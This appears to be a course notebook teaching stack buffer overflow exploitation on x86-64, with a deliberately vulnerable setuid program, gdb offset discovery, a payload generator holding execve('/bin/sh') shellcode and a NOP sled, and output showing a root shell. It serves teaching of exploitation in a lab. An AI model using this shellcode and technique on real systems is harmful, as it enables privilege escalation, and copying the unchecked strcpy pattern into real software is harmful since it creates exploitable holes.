# Stack Overflow on 64-bit x86-64 Architecture

- stack overflow on a 64-bit machine is similar to that on a 32-bit machine
- there are some minor differences and challenges that we need to consider
- significantly expands the number and size of the 32-bit architecture
- x64bit registers are 64-bit (8 byte) wide
- there are 16 general purpose registers prefix with R instead of E
    - RAX, RBX, RCX, RDX, RSI, RDI, RSP, RBP, R8, R9, R10, R11, R12, R13, R14, and R15
- each of these 64-bit registers also has associated 32-bit (e.g., EAX), 16-bit (e.g., AX), and 8-bit (e.g., AL, AH) sub-registers, which can be accessed independently
    - hence 64-bit architecture can run 32-bit programs
- 1 Instruction Pointer - RIP
- 1 Flags REgister (RFLAGS)
- many other special-purpose registers (e.g., segment registers: code segment, stack segment, etc. floating point registers)


## Stack Layout

- the stack layout on a x64 architecture is similar to that on a x86 architecture
- the major difference is how arguments are passed to functions
- in x86, recall that all arguments are passed on the stack in reverse order
- in x64, the first six arguments are passed in registers:
    - `rdi`, `rsi`, `rdx`, `rcx`, `r8`, and `r9`
- if there are more than six arguments, the rest are passed on the stack
- let's say we have a function `foo` that takes eight arguments:
    - `int foo(int a, int b, int c, int d, int e, int f, int g, int h)`
- the first six arguments are passed in registers:
    - a -> `rdi`; b->`rsi`, c->`rdx`, d->`rcx`, e->`r8`, and f->`r9`
- the last two arguments are passed on the stack:

```
lower address       |      ...          |
    ↑               |  local var2       | <- rbp - 16
    ↑               |  local var1       | <- rbp - 8
    ↑               |  caller rbp       | <- rbp
    ↑               |  return address   | <- rbp + 8
    ↑               |  arg g            | <- rbp + 16
    ↑               |  arg h            | <- rbp + 24
higher address      |       ...         |
```

## Zeros in Address - A challenge

- looking at the stack layout above, exploiting a x64 stack overflow is similar to that on a x86 machine
- however, the return address is 8 bytes long
- x64 only uses 48 bits of the 64-bit address space from `0x0000000000000000` to `0x00007FFFFFFFFFFF`
- this means that the return address will always have at least TWO bytes of zeros in the most significant bits
- having`\x00s` in the payload can be a challenge, beacuse the `strcpy`, `cin` functions will stop copying when it encounters a null byte (`\x00`)
- note that gdb will not print the most significant (prefix) zeros, so you will see the address as `0x7FFFFFFFE3C0` instead of `0x00007FFFFFFFE3C0`
- however, in little-endian, the address will be stored as `0xC0E3FF7FFFFF0000`
- this means that the return address will have two null bytes at the end of the address
- even if the `strcpy` function stops copying at the first null byte, the saved return address of the caller will still be overwritten with the correct address with the two null bytes currently at the end of the address
- meaning we only need to copy the 6 bytes and the first 2 bytes are 0's and already available

- let's say we want to overwrite `0x00007FFAAAAAAAAA` with `0x00007FFBBBBBBBBB`
- stack before overflow
```txt

lower address   | ....             |
                | ....             |
 return address | AAAAAAAAAFF70000 |
 
highter address | ......           |

```
- stack after overflow
```txt

lower address   | ....             |
                | ....             |
return address  | BBBBBBBBBFF70000 |
 
highter address | ......           |

```


## Example

- let's compile `/demos/stack_overflow/x64/stack.cpp` with the Makefile in the same directory
- Makefile compiles with all compiler protections disabled
- it also disables ASLR and stack canaries
- it compiles the program as setuid root, so that we can execute the program as root
- must run Makefile with sudo privilege


```python
%pwd
```




    '/home/kali/projects/SoftwareSecurity/demos/stack_overflow/x64'




```python
%cd ../demos/stack_overflow/x64/
```


```python
%pwd
```




    '/home/kali/projects/SoftwareSecurity/demos/stack_overflow/x64'




```python
! ls
```

    badfile.bin   generate_payload.py  pattern.txt		       stack.cpp
    bad.txt       good.txt		   peda.gdb		       stack.exe
    commands.gdb  Makefile		   peda-session-stack.exe.txt



```python
! cat stack.cpp
```

    #include <cstdlib>
    #include <iostream>
    #include <cstring>
    #include <fstream>
    #include <string>
    
    using namespace std;
    
    const int MAX_DATA = 200;
    
    void vulnerable(char *str) {
    	char buffer[100];
    	strcpy(buffer, str);
    	cout << buffer << endl;
    }
    
    int main(int argc, char *argv[]) {
    	char data[MAX_DATA];
    	//file_name = strcpy(file_name, argv[1]
    	FILE *fin;
    	fin = fopen(argv[1], "r");
    	fread(data, sizeof(char), MAX_DATA, fin);
    	vulnerable(data);
    	cout << "All done..." << endl;
    	return 0;
    }
    



```python
! make
```

    g++ -g -Wall -std=c++17 -fno-stack-protector -z execstack -no-pie stack.cpp  -o stack.exe 
    # must run make with sudo to disable randomaize_va_space
    echo 0 | tee /proc/sys/kernel/randomize_va_space
    tee: /proc/sys/kernel/randomize_va_space: Permission denied
    0
    make: *** [Makefile:24: build] Error 1



```python
! echo kali | sudo -S make
```

    [sudo] password for kali: g++ -g -Wall -std=c++17 -fno-stack-protector -z execstack -no-pie stack.cpp  -o stack.exe 
    # must run make with sudo to disable randomaize_va_space
    echo 0 | tee /proc/sys/kernel/randomize_va_space
    0
    sudo chown root:root stack.exe 
    sudo chmod +s stack.exe  



```python
! ls -al
```

    total 84
    drwxr-xr-x 2 kali kali  4096 Apr  4 15:25 .
    drwxr-xr-x 3 kali kali  4096 Apr  2 15:24 ..
    -rw-r--r-- 1 kali kali   128 Apr  4 14:52 badfile.bin
    -rw-r--r-- 1 kali kali   301 Mar 31 14:20 bad.txt
    -rw-r--r-- 1 kali kali   140 Mar 31 14:20 commands.gdb
    -rw-r--r-- 1 kali kali  1628 Apr  4 14:52 generate_payload.py
    -rw-r--r-- 1 kali kali    51 Mar 31 14:20 good.txt
    -rw-r--r-- 1 kali kali  1082 Mar 31 14:20 Makefile
    -rw-r--r-- 1 kali kali   500 Mar 31 14:20 pattern.txt
    -rw-r--r-- 1 kali kali    93 Mar 31 14:20 peda.gdb
    -rw-r--r-- 1 kali kali    18 Apr  4 14:47 peda-session-stack.exe.txt
    -rw-r--r-- 1 kali kali   489 Mar 31 14:20 stack.cpp
    -rwsr-sr-x 1 root root 32944 Apr  4 15:25 stack.exe



```python
! cat good.txt
```

    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA



```python
! cat commands.gdb
```

    set args good.txt
    break vulnerable
    run
    next
    print $rbp
    print &buffer
    print "offset: "
    print /d (void *)$rbp - (void *)&buffer
    continue
    quit


## runn commands.gdb script from Terminal

- note: don't run the gdb from Jupyter Notebook

```bash
┌──(kali㉿kali)-[~/…/SoftwareSecurity/demos/stack_overflow/x64]
└─$ gdb -q -x commands.gdb ./stack.exe
Reading symbols from ./stack.exe...
Breakpoint 1 at 0x401182: file stack.cpp, line 13.
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Warning: 'set logging off', an alias for the command 'set logging enabled', is deprecated.
Use 'set logging enabled off'.

Warning: 'set logging on', an alias for the command 'set logging enabled', is deprecated.
Use 'set logging enabled on'.

[----------------------------------registers-----------------------------------]
RAX: 0x7fffffffc5e0 ('A' <repeats 50 times>, "\n\367\377\177")
RBX: 0x7fffffffc7c8 --> 0x7fffffffccc5 ("/home/kali/projects/SoftwareSecurity/demos/stack_overflow/x64/stack.exe")
RCX: 0xfbad2498 
RDX: 0x0 
RSI: 0x417490 ('A' <repeats 50 times>, "\n")
RDI: 0x7fffffffc5e0 ('A' <repeats 50 times>, "\n\367\377\177")
RBP: 0x7fffffffc5c0 --> 0x7fffffffc6b0 --> 0x2 
RSP: 0x7fffffffc540 --> 0x7ffff7a94b40 (<flush_cleanup>:        sub    rsp,0x8)
RIP: 0x401182 (<_Z10vulnerablePc+12>:   lea    rax,[rbp-0x70])
R8 : 0x7ffff7bf1ac0 --> 0x0 
R9 : 0x4 
R10: 0x6 
R11: 0x246 
R12: 0x0 
R13: 0x7fffffffc7e0 --> 0x7fffffffcd16 ("COLORFGBG=15;0")
R14: 0x7ffff7ffd000 --> 0x7ffff7ffe2e0 --> 0x0 
R15: 0x403de8 --> 0x401140 (<__do_global_dtors_aux>:    endbr64)
EFLAGS: 0x203 (CARRY parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x401177 <_Z10vulnerablePc+1>:       mov    rbp,rsp
   0x40117a <_Z10vulnerablePc+4>:       add    rsp,0xffffffffffffff80
   0x40117e <_Z10vulnerablePc+8>:       mov    QWORD PTR [rbp-0x78],rdi
=> 0x401182 <_Z10vulnerablePc+12>:      lea    rax,[rbp-0x70]
   0x401186 <_Z10vulnerablePc+16>:      mov    rsi,rax
   0x401189 <_Z10vulnerablePc+19>:      lea    rax,[rip+0xe78]        # 0x402008
   0x401190 <_Z10vulnerablePc+26>:      mov    rdi,rax
   0x401193 <_Z10vulnerablePc+29>:      mov    eax,0x0
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffc540 --> 0x7ffff7a94b40 (<flush_cleanup>:       sub    rsp,0x8)
0008| 0x7fffffffc548 --> 0x7fffffffc5e0 ('A' <repeats 50 times>, "\n\367\377\177")
0016| 0x7fffffffc550 --> 0xc8 
0024| 0x7fffffffc558 --> 0x1 
0032| 0x7fffffffc560 --> 0xc8 
0040| 0x7fffffffc568 --> 0x7fffffffc5e0 ('A' <repeats 50 times>, "\n\367\377\177")
0048| 0x7fffffffc570 --> 0x7ffff7e93540 (0x00007ffff7e93540)
0056| 0x7fffffffc578 --> 0x7ffff7a88159 (<__GI__IO_fread+137>:  test   BYTE PTR [rbx+0x1],0x80)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, vulnerable (
    str=0x7fffffffc5e0 'A' <repeats 50 times>, "\n\367\377\177") at stack.cpp:13
13              printf("Buffer is at %p\n", &buffer);
Buffer is at 0x7fffffffc550
[----------------------------------registers-----------------------------------]
RAX: 0x1c 
RBX: 0x7fffffffc7c8 --> 0x7fffffffccc5 ("/home/kali/projects/SoftwareSecurity/demos/stack_overflow/x64/stack.exe")
RCX: 0x0 
RDX: 0x0 
RSI: 0x4184a0 ("Buffer is at 0x7fffffffc550\n")
RDI: 0x7fffffffc360 --> 0x7fffffffc390 ("Buffer is at 0x7fffffffc550\n")
RBP: 0x7fffffffc5c0 --> 0x7fffffffc6b0 --> 0x2 
RSP: 0x7fffffffc540 --> 0x7ffff7a94b40 (<flush_cleanup>:        sub    rsp,0x8)
RIP: 0x40119d (<_Z10vulnerablePc+39>:   mov    rdx,QWORD PTR [rbp-0x78])
R8 : 0x7ffff7bf1ac0 --> 0x0 
R9 : 0x4 
R10: 0x0 
R11: 0x202 
R12: 0x0 
R13: 0x7fffffffc7e0 --> 0x7fffffffcd16 ("COLORFGBG=15;0")
R14: 0x7ffff7ffd000 --> 0x7ffff7ffe2e0 --> 0x0 
R15: 0x403de8 --> 0x401140 (<__do_global_dtors_aux>:    endbr64)
EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x401190 <_Z10vulnerablePc+26>:      mov    rdi,rax
   0x401193 <_Z10vulnerablePc+29>:      mov    eax,0x0
   0x401198 <_Z10vulnerablePc+34>:      call   0x401030 <printf@plt>
=> 0x40119d <_Z10vulnerablePc+39>:      mov    rdx,QWORD PTR [rbp-0x78]
   0x4011a1 <_Z10vulnerablePc+43>:      lea    rax,[rbp-0x70]
   0x4011a5 <_Z10vulnerablePc+47>:      mov    rsi,rdx
   0x4011a8 <_Z10vulnerablePc+50>:      mov    rdi,rax
   0x4011ab <_Z10vulnerablePc+53>:      call   0x401040 <strcpy@plt>
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffc540 --> 0x7ffff7a94b40 (<flush_cleanup>:       sub    rsp,0x8)
0008| 0x7fffffffc548 --> 0x7fffffffc5e0 ('A' <repeats 50 times>, "\n\367\377\177")
0016| 0x7fffffffc550 --> 0xc8 
0024| 0x7fffffffc558 --> 0x1 
0032| 0x7fffffffc560 --> 0xc8 
0040| 0x7fffffffc568 --> 0x7fffffffc5e0 ('A' <repeats 50 times>, "\n\367\377\177")
0048| 0x7fffffffc570 --> 0x7ffff7e93540 (0x00007ffff7e93540)
0056| 0x7fffffffc578 --> 0x7ffff7a88159 (<__GI__IO_fread+137>:  test   BYTE PTR [rb+0x1],0x80)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
14              strcpy(buffer, str);
$1 = (void *) 0x7fffffffc5c0
$2 = (char (*)[100]) 0x7fffffffc550
$3 = "offset: "
$4 = 112
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
��
All done...
[Inferior 1 (process 572068) exited normally]
Warning: not running




```python
! cat peda.gdb
```

    pattern_create 500 pattern.txt
    set args pattern.txt
    break vulnerable
    run
    continue
    patts
    quit


## using peda to find the offset using cyclic pattern

- Look for [RSP] --> offset VALUE or [RBP]+8; note NO offset to RIP is printed

```bash
┌──(kali㉿kali)-[~/…/SoftwareSecurity/demos/stack_overflow/x64]
└─$ gdb -x peda.gdb ./stack.exe
GNU gdb (Debian 13.1-1) 13.1
Copyright (C) 2023 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<https://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from ./stack.exe...
Writing pattern of 500 chars to filename "pattern.txt"
Breakpoint 1 at 0x401182: file stack.cpp, line 13.
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Warning: 'set logging off', an alias for the command 'set logging enabled', is deprecated.
Use 'set logging enabled off'.

Warning: 'set logging on', an alias for the command 'set logging enabled', is deprecated.
Use 'set logging enabled on'.


[----------------------------------registers-----------------------------------]
RAX: 0x7fffffffc5e0 ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA"...)
RBX: 0x7fffffffc7c8 --> 0x7fffffffccc1 ("/home/kali/projects/SoftwareSecurity/demos/stack_overflow/x64/stack.exe")
RCX: 0x7ffff7b0d6dd (<__GI___libc_read+13>:     cmp    rax,0xfffffffffffff000)
RDX: 0x0 
RSI: 0x417490 ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA"...)
RDI: 0x7fffffffc5e0 ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA"...)
RBP: 0x7fffffffc5c0 --> 0x7fffffffc6b0 --> 0x2 
RSP: 0x7fffffffc540 --> 0x7ffff7a94b40 (<flush_cleanup>:        sub    rsp,0x8)
RIP: 0x401182 (<_Z10vulnerablePc+12>:   lea    rax,[rbp-0x70])
R8 : 0x7ffff7bf1ac0 --> 0x0 
R9 : 0x4 
R10: 0x6 
R11: 0x246 
R12: 0x0 
R13: 0x7fffffffc7e0 --> 0x7fffffffcd15 ("COLORFGBG=15;0")
R14: 0x7ffff7ffd000 --> 0x7ffff7ffe2e0 --> 0x0 
R15: 0x403de8 --> 0x401140 (<__do_global_dtors_aux>:    endbr64)
EFLAGS: 0x203 (CARRY parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x401177 <_Z10vulnerablePc+1>:       mov    rbp,rsp
   0x40117a <_Z10vulnerablePc+4>:       add    rsp,0xffffffffffffff80
   0x40117e <_Z10vulnerablePc+8>:       mov    QWORD PTR [rbp-0x78],rdi
=> 0x401182 <_Z10vulnerablePc+12>:      lea    rax,[rbp-0x70]
   0x401186 <_Z10vulnerablePc+16>:      mov    rsi,rax
   0x401189 <_Z10vulnerablePc+19>:      lea    rax,[rip+0xe78]        # 0x402008
   0x401190 <_Z10vulnerablePc+26>:      mov    rdi,rax
   0x401193 <_Z10vulnerablePc+29>:      mov    eax,0x0
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffc540 --> 0x7ffff7a94b40 (<flush_cleanup>:       sub    rsp,0x8)
0008| 0x7fffffffc548 --> 0x7fffffffc5e0 ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA"...)
0016| 0x7fffffffc550 --> 0xc8 
0024| 0x7fffffffc558 --> 0x1 
0032| 0x7fffffffc560 --> 0xc8 
0040| 0x7fffffffc568 --> 0x7fffffffc5e0 ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA"...)
0048| 0x7fffffffc570 --> 0x7ffff7e93540 (0x00007ffff7e93540)
0056| 0x7fffffffc578 --> 0x7ffff7a88159 (<__GI__IO_fread+137>:  test   BYTE PTR [rbx+0x1],0x80)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, vulnerable (
    str=0x7fffffffc5e0 "AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA"...) at stack.cpp:13
13              printf("Buffer is at %p\n", &buffer);
Buffer is at 0x7fffffffc550
AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA�rA

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
RAX: 0x404040 --> 0x7ffff7e5b310 --> 0x7ffff7d3df00 (<_ZNSoD1Ev>:       endbr64)
RBX: 0x7fffffffc7c8 --> 0x7fffffffccc1 ("/home/kali/projects/SoftwareSecurity/demos/stack_overflow/x64/stack.exe")
RCX: 0x7ffff7b0e210 (<__GI___libc_write+16>:    cmp    rax,0xfffffffffffff000)
RDX: 0x7ffff7e5b310 --> 0x7ffff7d3df00 (<_ZNSoD1Ev>:    endbr64)
RSI: 0x0 
RDI: 0x7ffff7bf3710 --> 0x0 
RBP: 0x41414e4141384141 ('AA8AANAA')
RSP: 0x7fffffffc5c8 ("jAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\260rA")
RIP: 0x4011da (<_Z10vulnerablePc+100>:  ret)
R8 : 0x7ffff7bf1ac0 --> 0x0 
R9 : 0x4 
R10: 0x6 
R11: 0x7ffff7a87650 (<__GI__IO_fflush>: test   rdi,rdi)
R12: 0x0 
R13: 0x7fffffffc7e0 --> 0x7fffffffcd15 ("COLORFGBG=15;0")
R14: 0x7ffff7ffd000 --> 0x7ffff7ffe2e0 --> 0x0 
R15: 0x403de8 --> 0x401140 (<__do_global_dtors_aux>:    endbr64)
EFLAGS: 0x10206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x4011d3 <_Z10vulnerablePc+93>:      call   0x401060 <_ZNSolsEPFRSoS_E@plt>
   0x4011d8 <_Z10vulnerablePc+98>:      nop
   0x4011d9 <_Z10vulnerablePc+99>:      leave
=> 0x4011da <_Z10vulnerablePc+100>:     ret
   0x4011db <main(int, char**)>:        push   rbp
   0x4011dc <main(int, char**)+1>:      mov    rbp,rsp
   0x4011df <main(int, char**)+4>:      sub    rsp,0xe0
   0x4011e6 <main(int, char**)+11>:     mov    DWORD PTR [rbp-0xd4],edi
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffc5c8 ("jAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\260rA")
0008| 0x7fffffffc5d0 ("AkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\260rA")
0016| 0x7fffffffc5d8 ("AAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\260rA")
0024| 0x7fffffffc5e0 ("RAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\260rA")
0032| 0x7fffffffc5e8 ("ApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\260rA")
0040| 0x7fffffffc5f0 ("AAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\260rA")
0048| 0x7fffffffc5f8 ("VAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\260rA")
0056| 0x7fffffffc600 ("AuAAXAAvAAYAAwAAZAAxAAyA\260rA")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x00000000004011da in vulnerable (
    str=0x7fffffffc5e0 "RAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\260rA")
    at stack.cpp:16
16      }
Registers contain pattern buffer:
RBP+0 found at offset: 112
Registers point to pattern buffer:
[RSP] --> offset 120 - size ~86
Pattern buffer found at:
0x00417490 : offset    0 - size  500 ([heap])
0x004184a0 : offset    0 - size  200 ([heap])
0x00007ffff7fa6084 : offset 33208 - size    4 (/usr/lib/x86_64-linux-gnu/libm.so.6)
0x00007fffffffc550 : offset    0 - size  200 ($sp + -0x78 [-30 dwords])
0x00007fffffffc61c : offset   60 - size  140 ($sp + 0x54 [21 dwords])
0x00007fffffffeaa0 : offset 31453 - size    4 ($sp + 0x24d8 [2358 dwords])
References to pattern buffer found at:
0x004172c8 : 0x00417490 ([heap])
0x004172d0 : 0x00417490 ([heap])
0x004172d8 : 0x00417490 ([heap])
0x004172e0 : 0x00417490 ([heap])
0x004172e8 : 0x00417490 ([heap])
0x00007ffff7bf25c8 : 0x004184a0 (/usr/lib/x86_64-linux-gnu/libc.so.6)
0x00007ffff7bf25d0 : 0x004184a0 (/usr/lib/x86_64-linux-gnu/libc.so.6)
0x00007ffff7bf25d8 : 0x004184a0 (/usr/lib/x86_64-linux-gnu/libc.so.6)
0x00007ffff7bf25e0 : 0x004184a0 (/usr/lib/x86_64-linux-gnu/libc.so.6)
0x00007ffff7bf25e8 : 0x004184a0 (/usr/lib/x86_64-linux-gnu/libc.so.6)
0x00007ffff7bf25f0 : 0x004184a0 (/usr/lib/x86_64-linux-gnu/libc.so.6)
0x00007ffff7bf25f8 : 0x004184a0 (/usr/lib/x86_64-linux-gnu/libc.so.6)
0x00007fffffffc1e0 : 0x004184a0 ($sp + -0x3e8 [-250 dwords])
0x00007fffffffc1f0 : 0x004184a0 ($sp + -0x3d8 [-246 dwords])
0x00007fffffffc1f8 : 0x004184a0 ($sp + -0x3d0 [-244 dwords])
0x00007fffffffc478 : 0x004184a0 ($sp + -0x150 [-84 dwords])
```


```python
# Python script to generate the payload
# make sure to FIX any FIXMEs to match your environment
! cat generate_payload.py
```

    #! /usr/bin/env python3
    
    import sys
    import argparse
    
    def main():
    	parser = argparse.ArgumentParser(description="Generate Payload File.")
    	parser.add_argument("GDB_SHIFT", help="Offset (int) the GDB shifting address to lower address...")
    
    	# Replace the content with the actual shellcode
    	# 64-bit execve('/bin/sh') setuid shellcode
    	SHELLCODE = (
    	    b"\x48\x31\xd2\x52\x48\xb8\x2f\x62\x69\x6e"
    	    b"\x2f\x2f\x73\x68\x50\x48\x89\xe7\x52\x57"
    	    b"\x48\x89\xe6\x48\x31\xc0\xb0\x3b\x0f\x05"
    	)
    
    	OFFSET = 120  # 112 Offset to rbp + 8 bytes
    	SHELLCODE_LEN = len(SHELLCODE)
    	ADD_LEN = 8  # Length of the address 4 bytes for 32-bit and 8 bytes for 64-bit
    	NOP_LEN = OFFSET - SHELLCODE_LEN
    	
    	args = parser.parse_args()
    	
    	GDB_SHIFT_COMPENSATION = int(args.GDB_SHIFT) # stack is shigted higher in GDB due to its own environment variables, args, etc.
    	RET_ADD = 0x7fffffffc550 + GDB_SHIFT_COMPENSATION  # FIXME: Change this address
    
    	# Remove the 00 from the address
    	# Note, 300 is added because the address shown in the gdb is different from
    	# the actual address shown in the stack when the program is running.
    	# This is because gdb pushes some values to the stack before running the program.
    	# You can try different values to get the correct address if the attack is not successful.
    	# Also, leading 00s not printed in gdb, but are automatically added by
    	#  .to_bytes(ADD_LEN, byteorder='little') to make it 8 bytes long.
    
    	#####################################################################
    	# Build the payload
    	# The content of the badfile is as follows:
    	NOP_SLED = b'\x90'*NOP_LEN
    	repeated_add = (RET_ADD).to_bytes(ADD_LEN, byteorder='little')
    	payload = NOP_SLED + SHELLCODE + repeated_add
    
    	# Write the payload to a binary file
    	file = 'badfile.bin'
    	with open(file, 'wb') as f:
    	    f.write(payload)
    	print(f'{file} payload file created.')
    	
    
    	#####################################################################
    	
    if __name__ == "__main__":
    	main()
    	



```python
! python generate_payload.py 315
```

    badfile.bin payload file created.



```python
! wc -c badfile.bin
```

    128 badfile.bin



```python
! hexdump -C badfile.bin
```

    00000000  90 90 90 90 90 90 90 90  90 90 90 90 90 90 90 90  |................|
    *
    00000050  90 90 90 90 90 90 90 90  90 90 48 31 d2 52 48 b8  |..........H1.RH.|
    00000060  2f 62 69 6e 2f 2f 73 68  50 48 89 e7 52 57 48 89  |/bin//shPH..RWH.|
    00000070  e6 48 31 c0 b0 3b 0f 05  8b c6 ff ff ff 7f 00 00  |.H1..;..........|
    00000080



```python
# create a /bin/sh symlink to /bin/zsh
! echo kali | sudo -S ln -sf /bin/zsh /bin/sh
```

    [sudo] password for kali: 

### Exploitation

- create `badfile.bin` payload with different argument (315, 325, 335, etc.)
- make sure the gdb compensation and the gdb buffer address doesn't add up to `00`
- run `stack.exe badfile.bin` from the Terminal to exploit the program with the payload in `badfile.bin`
- the program will execute the payload and spawn a shell as root
- the return address in the payload is many need to be adjusted to land it in the NOP sled
- you may need to do a bit of trial and error to get the correct address to land in the NOP sled
- you can write a bash/Python script to automate the process

```bash
┌──(kali㉿kali)-[~/…/SoftwareSecurity/demos/stack_overflow/x64]
└─$ python generate_payload.py 320
badfile.bin payload file created.
                                                                                                    
┌──(kali㉿kali)-[~/…/SoftwareSecurity/demos/stack_overflow/x64]
└─$ ./stack.exe badfile.bin       
������������������������������������������������������������������������������������������H1�RH�/bin//shPH��RWH��H1��;�����
# whoami                                                                                           
root
# date                                                                                             
Fri Apr  4 16:29:44 EDT 2025
# exit 

┌──(kali㉿kali)-[~/…/SoftwareSecurity/demos/stack_overflow/x64]
└─$ python generate_payload.py 325
badfile.bin payload file created.
                                                                                                    
┌──(kali㉿kali)-[~/…/SoftwareSecurity/demos/stack_overflow/x64]
└─$ ./stack.exe badfile.bin       
������������������������������������������������������������������������������������������H1�RH�/bin//shPH��RWH��H1��;�����
# whoami                                                                                           
root
# date                                                                                             
Fri Apr  4 16:30:34 EDT 2025
# exit 
```

## Small Buffer Challenge

- if the buffer is too small to fit the payload, you can't put the payload in the buffer before the return address
- you can't put the payload after the return address because of the null bytes in the return address
     - strcpy will stop copying when it encounters the null bytes
- however, the payload is already loaded into main's stack frame
- you can find the address of the payload in main's stack and use that address as the return address
- this is left as an exercise for the reader


